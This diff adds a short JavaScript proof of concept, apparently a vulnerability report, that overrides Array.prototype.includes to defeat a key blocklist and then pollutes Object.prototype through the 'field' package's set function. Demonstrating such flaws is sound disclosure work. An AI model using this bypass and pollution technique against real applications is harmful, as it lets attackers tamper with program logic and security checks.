@@ -1,0 +1,12 @@
+Array.prototype.includes = function (key) {
+    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
+        return false;
+    } else {
+        return true;
+    }
+};
+console.log({}.polluted);
+const field = require('field');
+const obj = {};
+field.set(obj, '__proto__.polluted', 'yes');
+console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');
